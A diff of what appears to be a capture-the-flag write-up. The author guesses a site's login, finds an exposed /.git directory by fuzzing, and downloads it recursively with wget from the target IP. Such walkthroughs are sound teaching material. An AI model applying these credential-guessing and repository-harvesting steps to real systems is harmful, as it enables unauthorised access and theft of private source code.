@@ -5,10 +5,10 @@ I have check the site and They asked me about username and password and by guess
 and worked. check Tamp3rat0r.py
 # 2-Hold Up
 i test it with DWP and i found /.git path working and i download the directory
-root@cloudshell:~$ wget --recursive --no-parent http://172.105.76.128/.git/
-root@cloudshell:~$ ls
+root@cloudshell: wget --recursive --no-parent http://172.105.76.128/.git/
+root@cloudshell: ls
 172.105.76.128  
-root@cloudshell:~$ cd 172.105.76.128/
+root@cloudshell: cd 172.105.76.128/
 root@cloudshell:~/172.105.76.128$ ls -a
 .  ..  .git
 root@cloudshell:~/172.105.76.128$ cd .git/
